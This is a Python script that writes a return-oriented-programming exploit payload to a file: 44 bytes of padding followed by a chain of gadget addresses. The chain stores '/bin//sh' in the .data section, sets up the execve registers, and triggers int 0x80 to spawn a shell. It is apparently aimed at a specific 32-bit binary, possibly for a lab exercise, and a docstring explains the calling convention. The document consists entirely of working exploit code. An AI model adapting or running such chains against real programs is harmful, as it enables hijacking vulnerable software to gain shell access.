"""
execve calling convention:

1. EAX = 11
2. EBX = "/bin//sh" (char *)
3. ECX = arguments (char **) -> char *arguments[3]= { "/bin//sh", NULL}
4. EDX = env (char **) -> NULL

"""


from struct import pack
import os
######################################
fileName=raw_input("Enter the file name")
outfile=open(fileName, "wb")
# Padding goes here
p = '\x41'*44

p += pack('<I', 0x0806ee8b) # pop edx ; ret
p += pack('<I', 0x080da060) # @ .data edx=0x080da060
p += pack('<I', 0x080a8bf6) # pop eax ; ret
p += '/bin' 				# eax=/bin
p += pack('<I', 0x08056d05) # mov dword ptr [edx], eax ; ret ->[080da060]=/bin
p += pack('<I', 0x0806ee8b) # pop edx ; ret
p += pack('<I', 0x080da064) # @ .data + 4 edx=0x080da064
p += pack('<I', 0x080a8bf6) # pop eax ; ret
p += '//sh'					# eax=//sh
p += pack('<I', 0x08056d05) # mov dword ptr [edx], eax ; ret ->[0x080da064]=//sh
p += pack('<I', 0x0806ee8b) # pop edx ; ret
p += pack('<I', 0x080da068) # @ .data + 8 edx=0x080da068
p += pack('<I', 0x080562c0) # xor eax, eax ; ret
p += pack('<I', 0x08056d05) # mov dword ptr [edx], eax ; ret ->null byte insertion
p += pack('<I', 0x080481c9) # pop ebx ; ret
p += pack('<I', 0x080da060) # @ .data -> ebx is set to program to execute [point 2]
p += pack('<I', 0x0806eeb2) # pop ecx ; pop ebx ; ret
p += pack('<I', 0x080da068) # @ .data + 8 -> ecx=0x080da068
p += pack('<I', 0x080da060) # padding without overwrite ebx 
p += pack('<I', 0x0806ee8b) # pop edx ; ret
p += pack('<I', 0x080da068) # @ .data + 8 edx=NULL [point 4]
p += pack('<I', 0x080562c0) # xor eax, eax ; ret eax=0
p += pack('<I', 0x0807c32a) # inc eax ; ret eax=1
p += pack('<I', 0x0807c32a) # inc eax ; ret
p += pack('<I', 0x0807c32a) # inc eax ; ret
p += pack('<I', 0x0807c32a) # inc eax ; ret
p += pack('<I', 0x0807c32a) # inc eax ; ret
p += pack('<I', 0x0807c32a) # inc eax ; ret
p += pack('<I', 0x0807c32a) # inc eax ; ret
p += pack('<I', 0x0807c32a) # inc eax ; ret
p += pack('<I', 0x0807c32a) # inc eax ; ret
p += pack('<I', 0x0807c32a) # inc eax ; ret
p += pack('<I', 0x0807c32a) # inc eax ; ret eax=11 [point1]
p += pack('<I', 0x08049603) # int 0x80

outfile.write(p)
outfile.close()
